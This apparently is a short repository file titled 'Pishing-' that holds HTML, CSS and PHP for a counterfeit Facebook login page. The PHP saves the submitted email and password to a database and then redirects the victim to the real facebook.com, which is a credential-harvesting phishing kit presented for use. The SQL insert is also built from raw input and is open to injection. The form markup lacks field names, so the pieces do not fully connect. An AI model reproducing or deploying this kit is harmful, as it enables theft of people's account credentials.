# Pishing-
HTML
!DOCTYPE html>
<link rel="stylesheet" href="./2.css">
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f2f5;
    }
    .login-box {
      width: 300px;
      padding: 20px;
      background-color: white;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }
    .login-box h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .input-field {
      margin-bottom: 10px;
    }
    .input-field input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
    }
    .input-field button {
      width: 100%;
      padding: 10px;
      background-color: #3b5998;
      color: white;
      border: none;
      cursor: pointer;
    }
    .input-field button:hover {
      background-color: #2d4376;
    }
    .forgot-password {
      text-align: right;
      margin-top: -10px;
      margin-bottom: 10px;
      font-size: 13px;
    }
    .footer-text {
      text-align: center;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Facebook</h2>
    <div class="input-field">
      <input type="text" placeholder="Email address or phone number">
    </div>
    <div class="input-field">
      <input type="password" placeholder="Password">
    </div>
    <div class="forgot-password">
      <a href="#">Forgotten account?</a>
    </div>
    <div class="input-field">
      <button>Log In</button>
    </div>
    <div class="footer-text">
      <a href="#">Create New Account</a>
    </div>
  </div>
</body>
</html>
CSS
body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #f0f2f5;
  }
  
  .login-box {
    width: 300px;
    padding: 20px;
    background-color: white;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
  }
  
  .login-box h2 {
    text-align: center;
    margin-bottom: 20px;
  }
  
  .input-field {
    margin-bottom: 10px;
  }
  
  .input-field input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
  }
  
  .input-field button {
    width: 100%;
    padding: 10px;
    background-color: #3b5998;
    color: white;
    border: none;
    cursor: pointer;
  }
  
  .input-field button:hover {
    background-color: #2d4376;
  }
  
  .forgot-password {
    text-align: right;
    margin-top: -10px;
    margin-bottom: 10px;
    font-size: 13px;
  }
  
  .footer-text {
    text-align: center;
    font-size: 13px;
  }
PHP
<?php
// Conexión a la base de datos
$servername = "localhost";
$username = "tu_usuario";
$password = "tu_contraseña";
$dbname = "tu_base_de_datos";

$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Procesar formulario de inicio de sesión
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Verificar si el usuario y contraseña son válidos
    // (aquí debes implementar la lógica para verificar la autenticidad del usuario)
    // Por ahora, solo guardamos los datos en la base de datos
    $sql = "INSERT INTO usuarios (email, password) VALUES ('$email', '$password')";
    $conn->query($sql);

    // Redirigir a la página oficial de Facebook
    header("Location: https://www.facebook.com");
    exit;
}

$conn->close();
?>
